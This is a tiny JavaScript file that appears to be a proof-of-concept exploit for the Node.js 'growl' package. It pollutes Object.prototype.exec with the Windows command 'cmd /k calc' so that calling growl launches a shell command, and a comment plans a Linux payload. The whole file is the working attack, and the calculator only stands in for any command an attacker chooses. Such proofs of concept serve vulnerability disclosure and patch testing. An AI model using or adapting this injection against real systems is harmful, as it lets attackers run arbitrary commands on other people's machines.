var growl = require('growl')

Object.prototype.exec = "cmd /k calc";

// TODO: add payload for Linux

growl('You have mail!')